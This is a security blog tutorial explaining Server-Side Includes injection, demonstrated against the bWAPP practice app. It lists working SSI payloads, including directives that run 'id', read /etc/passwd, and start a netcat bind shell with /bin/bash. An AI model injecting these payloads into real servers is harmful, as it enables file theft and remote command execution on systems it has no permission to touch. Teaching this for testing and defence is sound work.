---
layout:     post
title:      "Server-Side Includes (SSI) Injection"
subtitle:   "Injecting SSI Directives into HTML pages to execute arbitrary code remotely."
date:       2015-09-28 12:00:00
author:     "Snoopy, the Security Dog"
header-img: "img/post-bg-03.jpg"
---

<p>SSI (Server Side Includes) are directives that are placed in HTML pages, and evaluated on the server while the pages are being served. They let you add dynamically generated content to an existing HTML page, without having to serve the entire page via a CGI program, or other dynamic technology.
As an example, look at the below directive</p>
<blockquote>&lt;!--#echo var=&quot;DATE_LOCAL&quot; --&gt;</blockquote>
<p>When the page is served and rendered, the above directive will be evaluated to the current date used by the server.
In most cases, the best ways to find these vulnerabilities are to look for the following page extensions</p>
<li>.stm</li>
<li>.shtm </li>
<li>.shtml</li>
<p>For example, when using Apache; SSI directives are set using </p>
<blockquote>
AddType text/html .shtml
AddOutputFilter INCLUDES .shtml
</blockquote>


<p>But, it it also possible to use XBitHack directives to set any .html file extension to parse SSI directives. This can make the identification of the vulnerability much harder. Furthermore, the application should be invalidating special characters such as <strong>&lt; ! # = / . &quot; - &gt; and [a-zA-Z0-9]</strong> in order for successful exploitation. 
Successful exploitation of this vulnerability can lead to system file access, as well as remote code execution. The best way to find an SSI Injection is by injecting any of the following payloads in any form fields or headers in a vulnerable application.</p>
<blockquote>
&lt;!--#echo var=&quot;DATE_LOCAL&quot; --&gt;  &nbsp;   <i>(prints current date)</i><br>
&lt;!--#echo var=&quot;DOCUMENT_NAME&quot; --&gt;  &nbsp;   <i>(show current document filename)</i><br>
&lt;!--#exec cmd=&quot;id&quot; --&gt;		&nbsp; <i>(execute ‘id’ command)</i><br>
&lt;!--#exec cmd=&quot;cat /etc/passwd&quot; --&gt; &nbsp;   <i>(read passwd file)</i><br>
&lt;!--#echo var=&quot;DOCUMENT_URI&quot; --&gt;  &nbsp; <i>(show virtual path and filename)</i>
</blockquote>
<p>For better understanding, let’s look at an SSI Injection example available on bWAPP. The below web page uses<strong> &lt;!--#echo var=&quot;REMOTE_ADDR&quot; --&gt;</strong> directive to print a user’s IP address. But, the application also takes two values and returns it in the result page without any validation. </p>


<img alt="" src="http://snoopysecurity.github.io/img/ssrf/ssi1.png" />

<p>This can be exploited by using any of the above mentioned SSI payloads. I prefer using the ‘date local’ payload for initial detection since most web servers generally don't allow the use of the exec directive to execute system commands.</p>

<img alt="" src="http://snoopysecurity.github.io/img/ssrf/ssi2.png" />

<p>As expected, the current date and current document name is returned back in the page. This vulnerability can be further exploited by executing system commands to gain a remote shell.</p>
<blockquote>&lt;!--#exec cmd=&quot;nc -lvp 4444 -e /bin/bash&quot; --&gt;</blockquote>


<p>The above command starts a Netcat listener on port 4444. Netcat is a simple utility which reads and writes data across a network connection using TCP or UDP. If Netcat is running on the vulnerable server, you could use it to set up a listener and then redirect the output of operating system commands into the listener.
Using Netcat, it is possible to get a remote shell on the server.</p>

<img alt="" src="http://snoopysecurity.github.io/img/ssrf/ssi3.png" />

<p>If you are using Burp Suite Pro, this vulnerability will be identified by the Burp scanner when using the active scan function.</p>

<img alt="" src="http://snoopysecurity.github.io/img/ssrf/ssi4.png" />





